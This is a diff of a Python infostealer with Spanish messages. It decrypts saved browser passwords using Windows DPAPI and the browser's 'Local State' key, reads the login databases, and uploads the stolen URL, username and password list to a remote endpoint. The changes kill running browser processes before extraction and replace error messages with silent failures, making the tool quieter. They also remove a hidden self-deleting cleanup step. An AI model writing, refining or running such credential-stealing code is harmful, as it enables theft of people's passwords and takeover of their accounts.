@@ -33,6 +33,7 @@ def get_key(user_data_path):
             if os.path.exists(path):
                 with open(path, "r", encoding="utf-8") as f:
                     data = json.load(f)
+                
                 encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
                 if not encrypted_key_b64:
                     continue
@@ -40,8 +41,7 @@ def get_key(user_data_path):
                 decoded_key = base64.b64decode(encrypted_key_b64)
                 key_material = decoded_key[5:]
                 return win32crypt.CryptUnprotectData(key_material, None, None, None, 0)[1]
-        except Exception as e:
-            print(f"[-] Error obteniendo la clave maestra en {path}: {e}")
+        except Exception:
             continue
     return None
 
@@ -55,7 +55,7 @@ def decrypt(enc, key):
             return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
         else:
             return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
-    except Exception as e:
+    except Exception:
         try:
             return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
         except Exception:
@@ -70,8 +70,7 @@ def extract_from_db(db_path, key, creds, browser_name):
     
     try:
         shutil.copyfile(db_path, temp_path)
-    except Exception as e:
-        print(f"[-] No se pudo copiar la base de datos de {browser_name} (posiblemente esté abierta): {e}")
+    except Exception:
         if os.path.exists(temp_path):
             os.remove(temp_path)
         return
@@ -84,10 +83,11 @@ def extract_from_db(db_path, key, creds, browser_name):
         for url, user, pwd_enc in cur.fetchall():
             if user and pwd_enc:
                 pwd = decrypt(pwd_enc, key)
-                creds.append(f"[{browser_name}] URL: {url} | User: {user} | Pass: {pwd}")
+                if pwd:
+                    creds.append(f"[{browser_name}] URL: {url} | User: {user} | Pass: {pwd}")
         conn.close()
-    except Exception as e:
-        print(f"[-] Error al consultar la base de datos SQLite de {browser_name}: {e}")
+    except Exception:
+        pass
     finally:
         if os.path.exists(temp_path):
             try:
@@ -96,6 +96,7 @@ def extract_from_db(db_path, key, creds, browser_name):
                 pass
 
 def get_all_creds():
+    kill_browser_processes()
     creds = []
     browsers = get_browser_paths()
     
@@ -105,7 +106,6 @@ def get_all_creds():
             
         key = get_key(user_data_path)
         if not key:
-            print(f"[-] No se pudo obtener la llave de cifrado para {browser_name}")
             continue
             
         target_dirs = [user_data_path]
@@ -138,26 +138,11 @@ if __name__ == "__main__":
                     data={"content": f"**Credenciales totales extraídas: {len(accounts)}**"},
                     files={"file": (file_name, f, "text/plain")}
                 )
-        except Exception as e:
-            print(f"[-] Error al enviar el reporte: {e}")
+        except Exception:
+            pass
         finally:
             if os.path.exists(file_name):
                 try:
                     os.remove(file_name)
                 except:
                     pass
-
-    try:
-        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = subprocess.SW_HIDE
-
-        subprocess.Popen(
-            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
-            shell=True,
-            startupinfo=startupinfo,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-    except Exception:
-        pass
